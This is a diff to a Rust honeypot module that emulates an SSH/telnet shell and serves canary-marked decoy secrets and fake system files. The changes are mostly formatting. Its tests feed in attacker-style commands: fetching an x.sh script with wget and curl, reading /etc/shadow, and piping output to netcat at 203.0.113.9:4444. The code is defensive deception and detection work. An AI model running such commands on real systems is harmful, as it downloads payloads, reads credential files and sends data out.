@@ -140,12 +140,10 @@ pub(crate) async fn ssh_shell_session(
     canary: Option<&crate::canary::CanaryState>,
 ) -> SessionOutcome {
     let shared = Arc::new(ShellShared {
-        session: Mutex::new(ShellSession::new(
-            rt.username.clone(),
-            rt.hostname.clone(),
-            rt.max_commands,
-        )
-        .with_decoys(ShellSession::build_decoys(canary, &rt.username))),
+        session: Mutex::new(
+            ShellSession::new(rt.username.clone(), rt.hostname.clone(), rt.max_commands)
+                .with_decoys(ShellSession::build_decoys(canary, &rt.username)),
+        ),
         line: Mutex::new(String::new()),
         auth_user: Mutex::new(String::new()),
         auth_pw: Mutex::new(String::new()),
@@ -299,7 +297,9 @@ pub(crate) async fn telnet_shell_session(
     macro_rules! reply {
         ($text:expr) => {
             // 写失败 = 对端已断:留给读循环收尾
-            let _ = stream.write_all($text.replace('\n', "\r\n").as_bytes()).await;
+            let _ = stream
+                .write_all($text.replace('\n', "\r\n").as_bytes())
+                .await;
         };
     }
 
@@ -364,10 +364,7 @@ pub(crate) async fn telnet_shell_session(
         } else {
             Some(steps.to_vec())
         },
-        credentials: vec![crate::cred::RawCredential {
-            username,
-            password,
-        }],
+        credentials: vec![crate::cred::RawCredential { username, password }],
     }
 }
 
@@ -505,7 +502,6 @@ impl Handler for SshShellHandler {
     }
 }
 
-
 /// 会话内一行输入的处理结果
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum ShellAction {
@@ -547,7 +543,10 @@ impl ShellSession {
 
     /// 构造蜜饵文件表：canary 可用时敏感值内嵌水印（外泄使用即归因），
     /// 无 canary 时用固定显式合成值（红线：不得被当真实数据引用）。
-    pub(crate) fn build_decoys(canary: Option<&crate::canary::CanaryState>, user: &str) -> Vec<(String, String)> {
+    pub(crate) fn build_decoys(
+        canary: Option<&crate::canary::CanaryState>,
+        user: &str,
+    ) -> Vec<(String, String)> {
         let (app_key, db_pass, api_key) = match canary.and_then(|c| c.token("shell/env")) {
             Some(t) => (format!("base64:{t}"), t.clone(), t.clone()),
             None => (
@@ -562,15 +561,21 @@ impl ShellSession {
         vec![
             (
                 env_path.clone(),
-                format!("APP_KEY={app_key}\nDB_PASSWORD={db_pass}\nREDIS_URL=redis://:{db_pass}@127.0.0.1:6379\n"),
+                format!(
+                    "APP_KEY={app_key}\nDB_PASSWORD={db_pass}\nREDIS_URL=redis://:{db_pass}@127.0.0.1:6379\n"
+                ),
             ),
             (
                 cfg_path.clone(),
-                format!("database:\n  host: db-internal.prod\n  password: \"{db_pass}\"\napi:\n  key: {api_key}\n"),
+                format!(
+                    "database:\n  host: db-internal.prod\n  password: \"{db_pass}\"\napi:\n  key: {api_key}\n"
+                ),
             ),
             (
                 hist_path,
-                format!("cat /home/{user}/.env\ncd app && ./deploy.sh restart\nmysql -h db-internal.prod -u svc_app -p\nscp backup.tgz deploy@backup-internal:/srv/\ncat {cfg_path}\n"),
+                format!(
+                    "cat /home/{user}/.env\ncd app && ./deploy.sh restart\nmysql -h db-internal.prod -u svc_app -p\nscp backup.tgz deploy@backup-internal:/srv/\ncat {cfg_path}\n"
+                ),
             ),
             (
                 format!("/home/{user}/notes.txt"),
@@ -653,10 +658,7 @@ impl ShellSession {
             "wget" | "curl" => (self.download(program, &args), false),
             "chmod" => (String::new(), false),
             "history" => (self.history_reply(), false),
-            other => (
-                format!("bash: {other}: command not found"),
-                false,
-            ),
+            other => (format!("bash: {other}: command not found"), false),
         }
     }
 
@@ -780,7 +782,13 @@ fn ls_listing(path: &str) -> Option<Vec<&'static str>> {
             "root", "run", "sbin", "srv", "sys", "tmp", "usr", "var",
         ]),
         "/etc" => Some(vec![
-            "hostname", "hosts", "os-release", "passwd", "shadow", "ssh", "systemd",
+            "hostname",
+            "hosts",
+            "os-release",
+            "passwd",
+            "shadow",
+            "ssh",
+            "systemd",
         ]),
         "/home" => Some(vec!["deploy"]),
         "/var" => Some(vec!["log", "www"]),
@@ -793,24 +801,40 @@ fn ls_listing(path: &str) -> Option<Vec<&'static str>> {
 fn cat_file(path: &str, host: &str) -> Option<String> {
     match path {
         "/etc/hostname" => Some(format!("{host}\n")),
-        "/etc/passwd" => Some(concat!(
-            "root:x:0:0:root:/root:/bin/bash\n",
-            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
-            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
-            "deploy:x:1000:1000:deploy:/home/deploy:/bin/bash\n",
-        ).to_string()),        "/etc/shadow" => Some(concat!(
-            "root:*:19769:0:99999:7:::\n",
-            "daemon:*:19769:0:99999:7:::\n",
-            "deploy:$6$PLACEHOLDER$FAKEHASHNOTREAL:19769:0:99999:7:::\n",
-        ).to_string()),        "/etc/hosts" => Some(concat!(
-            "127.0.0.1\tlocalhost\n",
-            "127.0.1.1\tdebian-11\n",
-            "::1\tip6-localhost\n",
-        ).to_string()),        "/etc/os-release" => Some(concat!(
-            "PRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\n",
-            "NAME=\"Debian GNU/Linux\"\n",
-            "ID=debian\n",
-        ).to_string()),        _ => None,
+        "/etc/passwd" => Some(
+            concat!(
+                "root:x:0:0:root:/root:/bin/bash\n",
+                "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
+                "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
+                "deploy:x:1000:1000:deploy:/home/deploy:/bin/bash\n",
+            )
+            .to_string(),
+        ),
+        "/etc/shadow" => Some(
+            concat!(
+                "root:*:19769:0:99999:7:::\n",
+                "daemon:*:19769:0:99999:7:::\n",
+                "deploy:$6$PLACEHOLDER$FAKEHASHNOTREAL:19769:0:99999:7:::\n",
+            )
+            .to_string(),
+        ),
+        "/etc/hosts" => Some(
+            concat!(
+                "127.0.0.1\tlocalhost\n",
+                "127.0.1.1\tdebian-11\n",
+                "::1\tip6-localhost\n",
+            )
+            .to_string(),
+        ),
+        "/etc/os-release" => Some(
+            concat!(
+                "PRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\n",
+                "NAME=\"Debian GNU/Linux\"\n",
+                "ID=debian\n",
+            )
+            .to_string(),
+        ),
+        _ => None,
     }
 }
 
@@ -891,7 +915,10 @@ mod tests {
         let env = s.handle_line("cat /home/deploy/.env").unwrap_reply();
         assert!(env.contains("SYNTHETIC-DECOY"), "实际: {env}");
         let passwd = s.handle_line("cat /etc/passwd").unwrap_reply();
-        assert!(passwd.contains("deploy:x:1000"), "静态虚拟文件系统不受影响: {passwd}");
+        assert!(
+            passwd.contains("deploy:x:1000"),
+            "静态虚拟文件系统不受影响: {passwd}"
+        );
     }
 
     fn session() -> ShellSession {
@@ -902,37 +929,45 @@ mod tests {
     fn whitelist_commands_respond() {
         let mut s = session();
         assert_eq!(s.prompt(), "deploy@debian-11:~$ ");
-        assert_eq!(
-            s.handle_line("whoami"),
-            ShellAction::Reply("deploy".into())
+        assert_eq!(s.handle_line("whoami"), ShellAction::Reply("deploy".into()));
+        assert!(
+            s.handle_line("uname -a")
+                .reply_contains("Linux debian-11 6.1.0-18-amd64")
         );
-        assert!(s
-            .handle_line("uname -a")
-            .reply_contains("Linux debian-11 6.1.0-18-amd64"));
         assert_eq!(
             s.handle_line("pwd"),
             ShellAction::Reply("/home/deploy".into())
         );
         assert!(s.handle_line("id").reply_contains("uid=1000(deploy)"));
         assert!(s.handle_line("ls").reply_contains(".bash_history"));
-        assert!(s.handle_line("cat /etc/passwd").reply_contains("deploy:x:1000"));
-        assert!(s
-            .handle_line("cat /etc/hostname")
-            .reply_contains("debian-11"));
+        assert!(
+            s.handle_line("cat /etc/passwd")
+                .reply_contains("deploy:x:1000")
+        );
+        assert!(
+            s.handle_line("cat /etc/hostname")
+                .reply_contains("debian-11")
+        );
         assert!(s.handle_line("ps aux").reply_contains("/usr/sbin/sshd"));
         assert!(s.handle_line("ifconfig").reply_contains("inet 10.0.2.15"));
         assert!(s.handle_line("ip addr").reply_contains("10.0.2.15/24"));
-        assert!(s
-            .handle_line("netstat -antup")
-            .reply_contains("ESTABLISHED"));
-        assert!(s
-            .handle_line("wget http://203.0.113.10/x.sh")
-            .reply_contains("saved"));
-        assert!(s
-            .handle_line("curl -sL http://203.0.113.10/x.sh")
-            .reply_contains("100"));
+        assert!(
+            s.handle_line("netstat -antup")
+                .reply_contains("ESTABLISHED")
+        );
+        assert!(
+            s.handle_line("wget http://203.0.113.10/x.sh")
+                .reply_contains("saved")
+        );
+        assert!(
+            s.handle_line("curl -sL http://203.0.113.10/x.sh")
+                .reply_contains("100")
+        );
         // chmod 静默成功（对齐真实 chmod）
-        assert_eq!(s.handle_line("chmod +x x.sh"), ShellAction::Reply("".into()));
+        assert_eq!(
+            s.handle_line("chmod +x x.sh"),
+            ShellAction::Reply("".into())
+        );
     }
 
     #[test]
@@ -954,7 +989,9 @@ mod tests {
         let r = s.handle_line("whoami; cat /etc/shadow").unwrap_reply();
         assert_eq!(r, "deploy");
         assert_eq!(s.steps[0].command, "whoami; cat /etc/shadow");
-        let r = s.handle_line("uname -a | nc 203.0.113.9 4444").unwrap_reply();
+        let r = s
+            .handle_line("uname -a | nc 203.0.113.9 4444")
+            .unwrap_reply();
         assert!(r.contains("Linux debian-11"));
         let r = s.handle_line("pwd && whoami").unwrap_reply();
         assert_eq!(r, "/home/deploy");
@@ -997,9 +1034,10 @@ mod tests {
         assert!(!recorded.chars().any(|c| c.is_control() && c != '\t'));
         // 空行与纯分隔符
         assert_eq!(s.handle_line("   "), ShellAction::Reply(String::new()));
-        assert!(s
-            .handle_line(";")
-            .reply_contains("syntax error near unexpected token"));
+        assert!(
+            s.handle_line(";")
+                .reply_contains("syntax error near unexpected token")
+        );
     }
 
     #[test]
